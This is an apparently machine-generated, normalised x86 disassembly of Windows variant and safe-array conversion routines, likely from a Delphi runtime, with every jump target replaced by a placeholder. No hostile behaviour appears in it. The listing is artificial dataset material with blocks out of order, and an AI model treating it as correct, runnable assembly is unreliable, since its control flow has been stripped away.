lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb1d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40eb34
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eb64
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eb64
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ebc0
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea08
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ea08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eb34
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ea08
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ea08
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eb64
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea08
mov eax [ ebp - 0x314 ]
call sub_40edb8
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ed3c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ea08
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404038
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4139fc
test al al
je r-xdata
mov eax ebx
call sub_40ebc0
jmp r-xdata
push ebx
call VariantClear
call sub_40ea08
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40edd4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ee04
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ee04
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ee60
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea08
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ea08
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40edb8
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e760
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ea08
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ea08
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40edd4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ee04
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea08
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ea08
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f034
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ed3c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea08
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40408c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4139fc
test al al
je r-xdata
mov ecx sub_40f02c
mov edx esi
mov eax ebx
call sub_40ee60
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea08
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f0e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f034
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ed3c
sub_40f124
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f180
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f0e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f3ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f187
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
sub_40f190
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f1ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4127d0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f1d5
lea eax [ ebp - 0x4 ]
call sub_404718
retn
sub_40f1dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f21a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4120a8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f221
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40f228
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f266
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412e74
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4131e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f26d
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_40f274
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f2b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412da8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4131b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2b9
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_40f2c0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f3ac
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ea14
jmp r-xdata
mov edx esi
call sub_40e5d4
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ea14
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f340
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_4139fc
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f124
jmp r-xdata
mov edx esp
mov eax esi
call sub_4139fc
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f2c0
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f3ac
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f0e0
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f3ac
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f3f1 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f1dc
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40eb20
jmp r-xdata
mov eax ebx
call sub_40fd18
mov edx eax
mov eax esi
call sub_412ffc
jmp r-xdata
mov eax ebx
call sub_40f770
mov edx eax
mov eax esi
call sub_412f5c
jmp r-xdata
mov eax ebx
call sub_4110b4
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413048
jmp r-xdata
mov eax ebx
call sub_410d38
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_41306c
jmp r-xdata
mov eax ebx
call sub_4119f4
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413098
jmp r-xdata
mov eax ebx
call sub_41148c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4130c4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f190
jmp r-xdata
mov eax ebx
call sub_410830
mov edx eax
mov eax esi
call sub_4130f0
jmp r-xdata
mov eax ebx
call sub_40fbc0
mov edx eax
mov eax esi
call sub_412fdc
jmp r-xdata
mov eax ebx
call sub_40fc70
mov edx eax
mov eax esi
call sub_412f7c
jmp r-xdata
mov eax ebx
call sub_40fe10
mov edx eax
mov eax esi
call sub_412f9c
jmp r-xdata
mov eax ebx
call sub_40fee8
mov edx eax
mov eax esi
call sub_412fbc
jmp r-xdata
mov eax ebx
call sub_410234
push edx
push eax
mov eax esi
call sub_41301c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f228
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f274
jmp r-xdata
mov dx 0x101
call sub_40e5d4
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40edb8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f340
xor edx edx
mov ax 0x1
call sub_40e5d4
jmp r-xdata
sub_40f5d8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f67b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4127d0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4042c0
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408364
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f682
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404718
retn
mov eax ebx
call sub_410830
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ea14
jmp r-xdata
sub_40f68c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ea14
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f6c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f71c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f0e0
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f770
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f723
lea eax [ ebp - 0x14 ]
call sub_40edb8
retn
sub_40f72c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fb91
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f7a3 ]
mov eax [ ebp - 0x4 ]
call sub_40f5d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f5d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f770
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f6c8
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e5d4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f72c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40f9c7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b18
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f5d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f770
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403228
sub_40fbc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e5d4
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fc4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f770
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403228
sub_40fc70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e5d4
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fcf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f770
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403228
sub_40fd18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40fdec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f770
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fd3e ]
jmp [ eax * 4 + jump_table_40fd50 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403228
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e5d4
sub_40fe10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40fec5
